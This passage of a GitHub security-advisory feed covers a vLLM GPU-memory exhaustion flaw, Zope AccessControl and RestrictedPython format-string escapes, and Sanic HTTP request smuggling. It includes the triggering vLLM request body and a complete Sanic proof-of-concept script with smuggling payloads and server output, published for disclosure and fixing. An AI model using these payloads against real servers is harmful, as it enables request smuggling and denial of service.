<li><a href="https://github.com/advisories/GHSA-4hg4-9mf5-wxxq">https://github.com/advisories/GHSA-4hg4-9mf5-wxxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4hg4-9mf5-wxxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-04T16:39:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Request-selected PyNvVideoCodec GPU decode bypasses static VRAM reservation]]></title>
        <id>https://github.com/advisories/GHSA-8pw2-6jv3-mj5j</id>
        <link href="https://github.com/advisories/GHSA-8pw2-6jv3-mj5j"/>
        <updated>2026-09-17T17:17:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Current vLLM <code>main</code> lets an inference request choose the PyNvVideoCodec GPU video decoder through <code>media_io_kwargs.video.video_backend</code>, but engine GPU memory reservation is computed only from static startup configuration and <code>VLLM_VIDEO_LOADER_BACKEND</code>. If the server starts with the default OpenCV/software backend and no <code>--mm-ipc-gpu-memory-gb</code> budget, a client can still route a video request into the PyNvVideoCodec path after startup, causing frontend CUDA-context, decoder-surface, and decoded-frame GPU allocations that were not carved out of the engine KV-cache budget.</p>
<h2 id="technical-details">Technical Details</h2>
<p>The vulnerable boundary is the split between request-time media decoding choices in the API server and startup-time memory budgeting in the engine worker. Request bodies for Chat Completions and Responses expose <code>media_io_kwargs</code>, and those values are forwarded to the shared media connector. For video inputs, <code>MediaConnector.fetch_video()</code> copies <code>self.media_io_kwargs["video"]</code> into <code>video_io_kwargs</code>, only setting a model-derived backend when <code>video_backend</code> is absent. <code>VideoMediaIO.__init__()</code> then consumes <code>video_backend</code> from those kwargs and loads that backend from <code>VIDEO_LOADER_REGISTRY</code>.</p>
<p>The relevant request-side source path is:</p>
<pre><code class="language-python">video_io_kwargs = dict(self.media_io_kwargs.get("video", {}))
if "video_backend" not in video_io_kwargs and (
    video_backend := get_video_loader_backend_for_processor(video_processor)
):
    video_io_kwargs["video_backend"] = video_backend
video_io = VideoMediaIO(image_io, **video_io_kwargs)
</code></pre>
<pre><code class="language-python">video_loader_backend = (
    kwargs.pop("video_backend", None) or envs.VLLM_VIDEO_LOADER_BACKEND
)
self.video_loader = VIDEO_LOADER_REGISTRY.load(video_loader_backend)
</code></pre>
<p><code>VideoBackend.load_bytes()</code> then dispatches <code>backend == "pynvvideocodec"</code> into <code>decode_frames_pynvvideocodec()</code>, which constructs a PyNvVideoCodec decoder, creates or uses a CUDA stream, reads stream metadata, decodes selected frames on the GPU, and copies those frames into pinned host memory. The new frontend GPU memory pool accounts only for raw decoded frame bytes when a pool exists; it does not make request-time backend selection safe when no startup reservation was made.</p>
<p>The engine-side reservation code makes its decision from static model config and environment only:</p>
<pre><code class="language-python">def _uses_pynvvideocodec_video_backend(mm_config) -&gt; bool:
    video_kwargs = mm_config.media_io_kwargs.get("video", {})
    video_loader_backend = (
        video_kwargs.get("video_backend") or envs.VLLM_VIDEO_LOADER_BACKEND
    )
    codec_backend = video_kwargs.get("backend")
    return (
        video_loader_backend == PYNVVIDEOCODEC_VIDEO_BACKEND
        or codec_backend == PYNVVIDEOCODEC_VIDEO_BACKEND
    )
</code></pre>
<pre><code class="language-python">decoder_reserved_bytes = (
    num_api_servers * per_server_decoder_bytes
    if self._uses_pynvvideocodec_video_backend(mm_config)
    else 0
)
reserved_bytes = raw_frame_reserved_bytes + decoder_reserved_bytes
if reserved_bytes &lt;= 0:
    return available_kv_cache_memory_bytes
</code></pre>
<p>With default static video configuration, <code>mm_config.media_io_kwargs["video"]</code> does not name PyNvVideoCodec and <code>VLLM_VIDEO_LOADER_BACKEND</code> defaults to OpenCV/software decoding. The worker therefore reserves no PyNv decoder/CUDA-context bytes. A later request can still set <code>media_io_kwargs.video.video_backend="pynvvideocodec"</code> and reach the GPU decoder path because that runtime field is intentionally honored by <code>VideoMediaIO</code>.</p>
<h2 id="pov">PoV</h2>
<p>An ordinary multimodal inference request can carry the backend override in the request body:</p>
<pre><code class="language-json">{
  "model": "served-vlm",
  "messages": [
    {
      "role": "user",
      "content": [
        {"type": "text", "text": "summarize this clip"},
        {"type": "video_url", "video_url": {"url": "data:video/mp4;base64,&lt;small-mp4&gt;"}}
      ]
    }
  ],
  "media_io_kwargs": {
    "video": {
      "video_backend": "pynvvideocodec"
    }
  }
}
</code></pre>
<p>The following bounded source-level check confirms the code path without allocating GPU memory:</p>
<pre><code class="language-bash">git clone --filter=blob:none https://github.com/vllm-project/vllm.git
cd vllm
git checkout ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a
python3 check_pynv_backend_reservation.py --repo .
</code></pre>
<h2 id="poc">PoC</h2>
<p>The bounded check validates current source markers, simulates the exact static reservation predicate, and compares vulnerable and negative-control configurations. Key output:</p>
<pre><code class="language-json">{
  "vulnerable": true,
  "head": "ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a",
  "reservation_simulation": {
    "env_video_loader_backend": "opencv",
    "request_selects_pynv_after_startup": true,
    "vulnerable_static_reserved_bytes": 0,
    "negative_control_static_pynv_reserved_bytes": 2066953011,
    "raw_frame_only_control_reserved_bytes": 268435456,
    "unreserved_decoder_bytes_when_only_request_selects_pynv": 2066953011
  }
}
</code></pre>
<p>The negative control is important: when PyNvVideoCodec is selected statically, the worker reserves <code>2066953011</code> bytes per API process for decoder surfaces plus CUDA context. The vulnerable case reserves <code>0</code> bytes for the same decoder overhead because PyNvVideoCodec is selected only by the later request. A second control with static OpenCV plus <code>mm_ipc_gpu_memory_gb=0.25</code> reserves only the raw-frame semaphore budget and still does not reserve PyNv decoder/CUDA-context bytes.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can submit video requests to a vLLM deployment with PyNvVideoCodec available can force frontend GPU decoding even when the engine did not reserve memory for that decoder during startup. On high-utilization serving deployments, the unreserved CUDA context, retained decoder surfaces, and decoded-frame allocations can reduce or exhaust GPU memory that the engine assumed was available for weights, activations, or KV cache, causing request failures, worker crashes, or service-level denial of service.</p>
<p>Suggested severity is Medium with conservative CVSS v3.1 <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code> (6.5). If a deployment exposes the affected API without authentication, <code>PR:N</code> would raise the deployment-specific score. Suggested weaknesses are <code>CWE-770</code> (Allocation of Resources Without Limits or Throttling) and <code>CWE-400</code> (Uncontrolled Resource Consumption). This should not be rated Low because the affected resource is shared GPU memory in the serving path and the code already treats the PyNv decoder/CUDA-context footprint as large enough to reserve at startup when statically configured.</p>
<p>Limitations: exploitation requires a GPU deployment where PyNvVideoCodec is installed and usable, and the request must reach a video-capable model/path. The issue does not claim code execution, data disclosure, or SSRF.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Do not allow untrusted request fields to select a GPU decoder that was not included in startup memory reservation. The simplest fix is to reject request-level <code>media_io_kwargs.video.video_backend="pynvvideocodec"</code> unless the static server configuration already selected PyNvVideoCodec and reserved its decoder/CUDA-context budget.</p>
<p>If dynamic backend selection remains supported, split software and GPU decoder policies: allow request selection among CPU/software decoders only, require an explicit operator allowlist for GPU decoders, and include every request-selectable GPU decoder in the startup reservation predicate. Add regression coverage for static OpenCV startup config plus request-level PyNvVideoCodec override, and preserve the negative control where static PyNvVideoCodec configuration reserves decoder/CUDA-context bytes.</p>
<h2 id="affected-packageversions">Affected Package/Versions</h2>
<p>Package: <code>vllm</code> from <code>vllm-project/vllm</code>.</p>
<p>Confirmed affected: current <code>main</code> at <code>ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a</code>.</p>
<p>Introduced by: <code>af16446bf39de047ab57649c933063cf1cbf1e50</code>, <code>Vram semaphore infra (#44465)</code>, committed 2026-06-26T17:32:51-07:00.</p>
<p>Release status checked: <code>git tag --contains af16446bf</code> returned no release tags in the fresh checkout. GitHub repository metadata reported latest published release <code>v0.23.0</code> published 2026-06-15T05:27:20Z; the local <code>v0.24.0</code> tag also does not contain the introducing commit. The affected range should therefore be current <code>main</code> builds containing <code>af16446bf</code> until fixed, rather than a confirmed released-version range.</p>
<h2 id="advisory-history">Advisory History</h2>
<p>Public vLLM advisories checked included audio decompression-bomb DoS, unbounded <code>video/jpeg</code> frame-count DoS, MediaConnector SSRF, video processing RCE, multimodal embedding DoS/RCE, GGUF GPU memory exposure, multimodal hashing, and other request-parameter DoS classes. None matched request-selected PyNvVideoCodec or the static VRAM reservation mismatch.</p>
<p>Prior local/private vLLM report families checked included request-level <code>media_io_kwargs</code> reopening <code>video/jpeg</code> frame fanout, GLM video metadata amplification, and audio media decode duration-limit bypass. Those reports share the request-level media kwargs boundary, but they target CPU/media decode limits or model metadata amplification. This report targets a different privileged asset and fix surface: GPU decoder selection after engine startup memory reservation.</p>
<p>Focused GitHub issue/PR searches for <code>pynvvideocodec</code>, <code>mm_ipc_gpu_memory</code>, <code>video_backend media_io_kwargs</code>, <code>Vram semaphore infra</code>, and <code>frontend multimodal GPU decoding</code> found the PyNvVideoCodec zero-copy RFC, an old do-not-review prototype, merged PR <code>#44465</code>, and an unrelated TorchCodec backend PR. No public issue or PR described this security boundary.</p>
<h2 id="appendix-bounded-source-level-check">Appendix: Bounded Source-Level Check</h2>
<pre><code class="language-python">#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import re
import subprocess
from pathlib import Path

MIB = 1024 * 1024
GIB = 1024 * MIB

def read(repo: Path, rel: str) -&gt; str:
    return (repo / rel).read_text(encoding="utf-8")

def const_int(source: str, name: str) -&gt; int:
    expr = re.search(rf"^{name}\s*=\s*(.+)$", source, flags=re.MULTILINE).group(1).strip()
    if expr == "128 * MiB_bytes":
        return 128 * MIB
    if expr == "int(1.8 * 1024 * MiB_bytes)":
        return int(1.8 * 1024 * MIB)
    if expr == "1":
        return 1
    raise AssertionError(expr)

def uses_pynv_static(static_media_io_kwargs: dict[str, dict[str, str]], env_backend: str) -&gt; bool:
    video_kwargs = static_media_io_kwargs.get("video", {})
    video_loader_backend = video_kwargs.get("video_backend") or env_backend
    codec_backend = video_kwargs.get("backend")
    return video_loader_backend == "pynvvideocodec" or codec_backend == "pynvvideocodec"

def reserve_bytes(static_media_io_kwargs, env_backend, mm_ipc_gpu_memory_gb, decoder_bytes, cuda_context_bytes, retained_decoders):
    raw_frame_reserved_bytes = int(mm_ipc_gpu_memory_gb * GIB)
    per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes
    decoder_reserved_bytes = per_server_decoder_bytes if uses_pynv_static(static_media_io_kwargs, env_backend) else 0
    return raw_frame_reserved_bytes + decoder_reserved_bytes

parser = argparse.ArgumentParser()
parser.add_argument("--repo", required=True, type=Path)
repo = parser.parse_args().repo.resolve()

media_video = read(repo, "vllm/multimodal/media/video.py")
connector = read(repo, "vllm/multimodal/media/connector.py")
chat_protocol = read(repo, "vllm/entrypoints/openai/chat_completion/protocol.py")
responses_protocol = read(repo, "vllm/entrypoints/openai/responses/protocol.py")
gpu_worker = read(repo, "vllm/v1/worker/gpu_worker.py")
video_core = read(repo, "vllm/multimodal/video.py")

assert "media_io_kwargs: dict[str, dict[str, Any]] | None = Field(" in chat_protocol
assert "media_io_kwargs: dict[str, dict[str, Any]] | None = Field(" in responses_protocol
assert 'video_io_kwargs = dict(self.media_io_kwargs.get("video", {}))' in connector
assert 'if "video_backend" not in video_io_kwargs and (' in connector
assert 'kwargs.pop("video_backend", None) or envs.VLLM_VIDEO_LOADER_BACKEND' in media_video
assert "elif backend == PYNVVIDEOCODEC_VIDEO_BACKEND:" in video_core
assert 'video_kwargs = mm_config.media_io_kwargs.get("video", {})' in gpu_worker

decoder_bytes = const_int(video_core, "PYNVVIDEOCODEC_DECODER_GPU_MEMORY_BYTES")
retained_decoders = const_int(video_core, "PYNVVIDEOCODEC_MAX_RETAINED_DECODERS")
cuda_context_bytes = const_int(video_core, "PYNVVIDEOCODEC_CUDA_CONTEXT_BYTES")
per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes

vulnerable_static_reserved = reserve_bytes({}, "opencv", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)
negative_control_reserved = reserve_bytes({"video": {"video_backend": "pynvvideocodec"}}, "opencv", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)
raw_frame_only_control = reserve_bytes({}, "opencv", 0.25, decoder_bytes, cuda_context_bytes, retained_decoders)

head = subprocess.check_output(["git", "-C", str(repo), "rev-parse", "HEAD"], text=True).strip()
print(json.dumps({
    "head": head,
    "vulnerable": vulnerable_static_reserved == 0 and negative_control_reserved == per_server_decoder_bytes,
    "reservation_simulation": {
        "env_video_loader_backend": "opencv",
        "request_selects_pynv_after_startup": True,
        "vulnerable_static_reserved_bytes": vulnerable_static_reserved,
        "negative_control_static_pynv_reserved_bytes": negative_control_reserved,
        "raw_frame_only_control_reserved_bytes": raw_frame_only_control,
        "unreserved_decoder_bytes_when_only_request_selects_pynv": per_server_decoder_bytes,
    },
}, indent=2, sort_keys=True))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-8pw2-6jv3-mj5j">https://github.com/vllm-project/vllm/security/advisories/GHSA-8pw2-6jv3-mj5j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-69147">https://nvd.nist.gov/vuln/detail/CVE-2026-69147</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/47259">https://github.com/vllm-project/vllm/pull/47259</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/283893c72292ede38d277e3cd2b9b64c3e4f1dda">https://github.com/vllm-project/vllm/commit/283893c72292ede38d277e3cd2b9b64c3e4f1dda</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/ba22152096b2484faa3579624a253d54804d876d">https://github.com/vllm-project/vllm/commit/ba22152096b2484faa3579624a253d54804d876d</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.25.0">https://github.com/vllm-project/vllm/releases/tag/v0.25.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8pw2-6jv3-mj5j">https://github.com/advisories/GHSA-8pw2-6jv3-mj5j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8pw2-6jv3-mj5j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T17:17:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[AccessControl] Zope AccessControl vulnerable to information disclosure through Python string `format` and `format_map` functions]]></title>
        <id>https://github.com/advisories/GHSA-pq59-9fq7-m886</id>
        <link href="https://github.com/advisories/GHSA-pq59-9fq7-m886"/>
        <updated>2026-09-17T16:30:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Python's string <code>format</code> functionality allows someone controlling the format string to "read" objects accessible (recursively) via attribute access and subscription from accessible objects. Those attribute accesses and subscriptions use Python's full blown <code>getattr</code> and <code>getitem</code>, not the policy restricted <code>AccessControl</code> variants <code>_getattr_</code> and <code>_getitem_</code>. This can lead to critical information disclosure.</p>
<p>The <code>AccessControl</code> package already guards against direct access to the formatting functions on string instances, but these mitigations did not cover subclasses of <code>str</code>.</p>
<p>Affected are all users who allow untrusted users to create AccessControl controlled Python code and execute it.</p>
<h3 id="patches">Patches</h3>
<p>A fix was published with version 7.4.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-pq59-9fq7-m886">https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-pq59-9fq7-m886</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77401">https://nvd.nist.gov/vuln/detail/CVE-2026-77401</a></li>
<li><a href="https://github.com/zopefoundation/AccessControl/commit/f980450eea416718be62847f34dfd51822938e43">https://github.com/zopefoundation/AccessControl/commit/f980450eea416718be62847f34dfd51822938e43</a></li>
<li><a href="https://github.com/zopefoundation/AccessControl/releases/tag/7.4">https://github.com/zopefoundation/AccessControl/releases/tag/7.4</a></li>
<li><a href="https://github.com/advisories/GHSA-pq59-9fq7-m886">https://github.com/advisories/GHSA-pq59-9fq7-m886</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq59-9fq7-m886</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T16:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[RestrictedPython] RestrictedPython vulnerable to sandbox escape via string.Formatter field resolution]]></title>
        <id>https://github.com/advisories/GHSA-hp3v-5vw7-fx9w</id>
        <link href="https://github.com/advisories/GHSA-hp3v-5vw7-fx9w"/>
        <updated>2026-09-17T16:30:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>RestrictedPython could allow a sandbox escape when a policy exposes the standard library <code>string</code> module, or otherwise exposes <code>string.Formatter</code>, to restricted code.</p>
<p><code>string.Formatter</code> field resolution methods such as <code>get_field</code> can perform attribute and item traversal internally and return live object references. This can bypass RestrictedPython's normal attribute guards and may allow access to sensitive objects such as function globals, builtins, file access, or code execution primitives.</p>
<p>Users are impacted if they run untrusted code with RestrictedPython and expose <code>string.Formatter</code>, directly or indirectly, for example through a custom import policy or globals.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been patched by blocking access to <code>string.Formatter</code> and unsafe <code>string.Formatter</code> traversal methods in <code>safer_getattr</code>.</p>
<p>Users should upgrade to the patched release once available. Affected and patched version numbers should be filled in when the release is published.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not expose the standard library <code>string</code> module or <code>string.Formatter</code> to restricted code.</p>
<p>If a custom import hook is used, deny imports of <code>string</code> or provide only a restricted wrapper that does not expose <code>Formatter</code>. If custom globals are supplied, ensure neither <code>string.Formatter</code> nor <code>Formatter</code> instances are available to restricted code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-hp3v-5vw7-fx9w">https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-hp3v-5vw7-fx9w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76825">https://nvd.nist.gov/vuln/detail/CVE-2026-76825</a></li>
<li><a href="https://github.com/zopefoundation/RestrictedPython/commit/3b47440070b91f8807c2b2998aca99e94783639a">https://github.com/zopefoundation/RestrictedPython/commit/3b47440070b91f8807c2b2998aca99e94783639a</a></li>
<li><a href="https://github.com/zopefoundation/RestrictedPython/releases/tag/8.4">https://github.com/zopefoundation/RestrictedPython/releases/tag/8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-hp3v-5vw7-fx9w">https://github.com/advisories/GHSA-hp3v-5vw7-fx9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hp3v-5vw7-fx9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T16:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanic] sanic chunked trailer request smuggling allows hidden second request execution]]></title>
        <id>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</id>
        <link href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5"/>
        <updated>2026-09-17T14:59:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Sanic's HTTP/1.1 chunked-body handling does not fully consume the <code>trailer-part</code> after the terminating <code>0\r\n</code> chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer <code>POST /</code> request that correctly returns <code>405 Method Not Allowed</code> is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.</p>
<p>The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected <code>405</code> for the outer <code>POST /</code>, then a separate <code>200 OK</code> for a hidden <code>GET /</code>. A second exploit variant changes the hidden request path and receives a real <code>404 Not Found</code>, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from <code>GET</code> to <code>:GET</code>, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.</p>
<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
<ol>
<li>Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on <code>127.0.0.1:9381</code> and the root route allowed <code>GET /</code> but not <code>POST /</code>.</li>
<li>From the package root, run the provided PoC:</li>
</ol>
<pre><code class="language-bash">python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
</code></pre>
<ol start="3">
<li>Review the baseline case in <code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>. A normal chunked request with <code>0\r\n\r\n</code> returns exactly one response block:</li>
</ol>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
HTTP/1.1 405 Method Not Allowed
</code></pre>
<ol start="4">
<li>Review the exploit case that hides <code>GET /</code> in the trailer area:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
</code></pre>
<p>The PoC sends a single TCP payload containing:</p>
<pre><code class="language-text">POST / HTTP/1.1
Host: 127.0.0.1:9381
Connection: keep-alive
Transfer-Encoding: chunked

1
X
0
a:GET / HTTP/1.1
Host: 127.0.0.1:9381
</code></pre>
<ol start="5">
<li>Confirm that Sanic returns two response blocks from that one send:</li>
</ol>
<pre><code class="language-text">Received response blocks: 2
HTTP/1.1 405 Method Not Allowed
...
HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<ol start="6">
<li>Review the second exploit case that changes the smuggled request path to a nonexistent route:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
</code></pre>
<p>Confirm that Sanic again returns two response blocks and that the second response is a real routed <code>404 Not Found</code> for the attacker-controlled hidden path.
7. Review the control case with a two-character trailer field name:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
</code></pre>
<p>Confirm that the second request is now interpreted as <code>:GET /</code>, producing a second <code>405</code> with <code>Method :GET not allowed for URL /</code>. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.</p>
<h2 id="recommendations">Recommendations</h2>
<p>After parsing the terminating <code>0</code> chunk, Sanic must continue parsing and fully consuming the <code>trailer-part</code> until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating <code>0\r\n</code> other than the expected final empty line, and then close the connection instead of keeping it alive.</p>
<p>Add regression coverage for all three cases shown in the evidence: a normal <code>0\r\n\r\n</code> chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.</p>
<h2 id="poc">poc</h2>
<pre><code class="language-python">#!/usr/bin/env python3
"""Proof of concept for HTTP/1.1 chunked trailer request injection."""

from __future__ import annotations

import socket
from dataclasses import dataclass
from typing import Iterable


TARGET = "sanic-org/sanic"
BASE_URL = "http://127.0.0.1:9381"
HOST = "127.0.0.1"
PORT = 9381
TIMEOUT = 1.0
PROXY = None
AUTH_HEADERS: dict[str, str] = {}


@dataclass
class Case:
    name: str
    payload: bytes
    expected_responses: int
    expected_markers: tuple[bytes, ...]


def build_prefix() -&gt; bytes:
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"Connection: keep-alive\r\n"
        + b"Transfer-Encoding: chunked\r\n"
        + b"\r\n"
        + b"1\r\n"
        + b"X\r\n"
    )


def build_case_payload(path: str | None = None, field_name: str = "a") -&gt; bytes:
    prefix = build_prefix()
    if path is None:
        return prefix + b"0\r\n\r\n"
    return (
        prefix
        + b"0\r\n"
        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"\r\n"
    )


def send_payload(payload: bytes) -&gt; bytes:
    response = bytearray()
    with socket.create_connection((HOST, PORT), timeout=3) as sock:
        sock.sendall(payload)
        sock.settimeout(TIMEOUT)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def count_http_responses(response: bytes) -&gt; int:
    return response.count(b"HTTP/1.1 ")


def ensure_markers(case: Case, response: bytes) -&gt; None:
    actual_count = count_http_responses(response)
    if actual_count != case.expected_responses:
        raise SystemExit(
            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
        )
    for marker in case.expected_markers:
        if marker not in response:
            raise SystemExit(
                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
            )


def render_payload(payload: bytes) -&gt; str:
    return payload.decode("latin1", "replace")


def render_response(response: bytes) -&gt; str:
    return response.decode("latin1", "replace")


def iter_cases() -&gt; Iterable[Case]:
    yield Case(
        name="baseline_no_trailer",
        payload=build_case_payload(),
        expected_responses=1,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method POST not allowed for URL /",
        ),
    )
    yield Case(
        name="exploit_smuggled_root",
        payload=build_case_payload("/"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 200 OK",
            b'{"test":true}',
        ),
    )
    yield Case(
        name="exploit_smuggled_404",
        payload=build_case_payload("/this-path-should-not-exist"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 404 Not Found",
            b"Requested URL /this-path-should-not-exist not found",
        ),
    )
    yield Case(
        name="offset_control_two_char_field_name",
        payload=build_case_payload("/", field_name="ab"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method :GET not allowed for URL /",
        ),
    )


def main() -&gt; None:
    print(f"Target: {TARGET}")
    print(f"Base URL: {BASE_URL}")
    print()
    for case in iter_cases():
        print(f"=== CASE: {case.name} ===")
        print("Sent payload:")
        print(render_payload(case.payload))
        response = send_payload(case.payload)
        ensure_markers(case, response)
        print(f"Received response blocks: {count_http_responses(response)}")
        print("Raw response:")
        print(render_response(response))
        print("[OK] Case verified")
        print()


if __name__ == "__main__":
    main()
</code></pre>
<h2 id="evidence-files">Evidence Files</h2>
<p>The attachment package includes the exact PoC and the full runtime output from the verified local execution.</p>
<ul>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.py</code>: full PoC used for the verified run.</li>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>: runtime output showing the baseline behavior, the successful smuggled <code>GET /</code> execution, the successful smuggled <code>GET /this-path-should-not-exist</code> execution, and the trailer-offset control case.</li>
</ul>
<p>Observed baseline behavior:</p>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /
</code></pre>
<p>Observed hidden second request execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<p>Observed hidden attacker-controlled path execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 404 Not Found
...
Requested URL /this-path-should-not-exist not found
</code></pre>
<p>Observed trailer-offset control:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 405 Method Not Allowed
...
Method :GET not allowed for URL /
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.</p>
<p>This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3164">https://github.com/sanic-org/sanic/pull/3164</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3165">https://github.com/sanic-org/sanic/pull/3165</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22">https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea">https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6">https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6</a></li>
